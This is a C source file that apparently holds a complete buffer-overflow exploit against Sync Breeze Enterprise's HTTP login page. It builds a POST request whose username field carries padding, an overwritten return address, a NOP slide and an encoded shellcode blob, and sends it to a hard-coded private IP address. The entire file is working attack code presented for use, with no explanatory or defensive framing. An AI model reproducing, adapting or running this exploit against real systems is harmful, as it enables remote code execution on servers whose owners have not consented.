/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.243.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 172.16.116.222\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://172.16.116.222/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 781;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83

    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xda\xce\xd9\x74\x24\xf4\xba\xd0\xbc\x28\x91\x5d\x31\xc9\xb1"
    "\x52\x31\x55\x17\x83\xed\xfc\x03\x85\xaf\xca\x64\xd9\x38\x88"
    "\x87\x21\xb9\xed\x0e\xc4\x88\x2d\x74\x8d\xbb\x9d\xfe\xc3\x37"
    "\x55\x52\xf7\xcc\x1b\x7b\xf8\x65\x91\x5d\x37\x75\x8a\x9e\x56"
    "\xf5\xd1\xf2\xb8\xc4\x19\x07\xb9\x01\x47\xea\xeb\xda\x03\x59"
    "\x1b\x6e\x59\x62\x90\x3c\x4f\xe2\x45\xf4\x6e\xc3\xd8\x8e\x28"
    "\xc3\xdb\x43\x41\x4a\xc3\x80\x6c\x04\x78\x72\x1a\x97\xa8\x4a"
    "\xe3\x34\x95\x62\x16\x44\xd2\x45\xc9\x33\x2a\xb6\x74\x44\xe9"
    "\xc4\xa2\xc1\xe9\x6f\x20\x71\xd5\x8e\xe5\xe4\x9e\x9d\x42\x62"
    "\xf8\x81\x55\xa7\x73\xbd\xde\x46\x53\x37\xa4\x6c\x77\x13\x7e"
    "\x0c\x2e\xf9\xd1\x31\x30\xa2\x8e\x97\x3b\x4f\xda\xa5\x66\x18"
    "\x2f\x84\x98\xd8\x27\x9f\xeb\xea\xe8\x0b\x63\x47\x60\x92\x74"
    "\xa8\x5b\x62\xea\x57\x64\x93\x23\x9c\x30\xc3\x5b\x35\x39\x88"
    "\x9b\xba\xec\x1f\xcb\x14\x5f\xe0\xbb\xd4\x0f\x88\xd1\xda\x70"
    "\xa8\xda\x30\x19\x43\x21\xd3\xe6\x3c\x5e\xd0\x8f\x3e\xa0\x35"
    "\x78\xb6\x46\x53\x68\x9e\xd1\xcc\x11\xbb\xa9\x6d\xdd\x11\xd4"
    "\xae\x55\x96\x29\x60\x9e\xd3\x39\x15\x6e\xae\x63\xb0\x71\x04"
    "\x0b\x5e\xe3\xc3\xcb\x29\x18\x5c\x9c\x7e\xee\x95\x48\x93\x49"
    "\x0c\x6e\x6e\x0f\x77\x2a\xb5\xec\x76\xb3\x38\x48\x5d\xa3\x84"
    "\x51\xd9\x97\x58\x04\xb7\x41\x1f\xfe\x79\x3b\xc9\xad\xd3\xab"
    "\x8c\x9d\xe3\xad\x90\xcb\x95\x51\x20\xa2\xe3\x6e\x8d\x22\xe4"
    "\x17\xf3\xd2\x0b\xc2\xb7\xf3\xe9\xc6\xcd\x9b\xb7\x83\x6f\xc6"
    "\x47\x7e\xb3\xff\xcb\x8a\x4c\x04\xd3\xff\x49\x40\x53\xec\x23"
    "\xd9\x36\x12\x97\xda\x12";

    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}